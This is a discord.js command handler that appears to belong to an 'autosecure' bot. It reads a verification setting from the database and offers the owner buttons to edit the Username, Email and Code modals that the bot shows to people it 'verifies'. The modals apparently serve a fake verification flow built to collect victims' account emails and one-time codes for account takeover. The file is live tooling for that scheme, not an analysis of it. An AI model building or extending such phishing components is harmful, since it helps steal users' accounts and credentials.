const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require("../../../db/database");

module.exports = {
  name: "editmodals",
editmodals: true,
  callback: async (client, interaction) => {
    let botnumber = interaction.customId.split("|")[1];
    let ownerid = interaction.customId.split("|")[2];

    const settings = await queryParams(
      `SELECT verification_type FROM autosecure WHERE user_id = ? AND botnumber = ?`,
      [ownerid, botnumber]
    );

    const verificationType = settings.length > 0 ? settings[0].verification_type : 0;
    const verificationMode = !(verificationType === 1);

    return interaction.reply({
      embeds: [
        {
          title: "Choose which modal to change, it will be saved automatically!",
          description: verificationMode
            ? "Note: Your verification mode is set to 'Username & Email: Together'. With this setting, The title you put for the Username Modal, will be used as the title for this combined modal."
            : null,
          color: 0xc8c8c8,
        },
      ],
      components: [
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
            .setCustomId(`modal|username|${botnumber}|${ownerid}`)
            .setLabel("Username Modal")
            .setStyle(ButtonStyle.Primary),
          new ButtonBuilder()
            .setCustomId(`modal|email|${botnumber}|${ownerid}`)
            .setLabel("Email Modal")
            .setStyle(ButtonStyle.Primary),
          new ButtonBuilder()
            .setCustomId(`modal|code|${botnumber}|${ownerid}`)
            .setLabel("Code Modal")
            .setStyle(ButtonStyle.Primary)
        ),
      ],
      ephemeral: true,
    });
  },
};
